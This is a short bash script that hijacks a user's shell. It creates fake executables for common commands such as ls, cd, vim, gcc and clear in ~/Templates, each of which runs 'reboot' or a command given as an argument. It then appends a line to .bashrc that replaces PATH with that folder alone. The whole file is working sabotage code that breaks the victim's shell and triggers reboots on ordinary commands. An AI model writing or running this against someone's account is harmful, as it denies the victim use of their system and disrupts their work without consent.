#!/bin/bash

mkdir -p /home/$USER/Templates

commands=("ls" "cd" "emacs" "vim" "nano" "cp" "mv" "mkdir" "gcc" "touch" "clear")
new=$([ -z "$1" ] && echo "reboot" || echo $1)
echo $new

for i in "${commands[@]}"; do
    touch /home/$USER/Templates/$i
    echo -e "#!/bin/bash\n$new" > /home/$USER/Templates/$i
    chmod a+x /home/$USER/Templates/$i
done

#touch /home/$USER/Templates/ls
#echo -e "#!/bin/bash\n/bin/cat /tmp/test/main.c" > /home/$USER/Templates/ls
#chmod a+x /home/$USER/Templates/ls

echo -e "\nexport PATH='/home/$USER/Templates'\0" >> /home/$USER/.bashrc
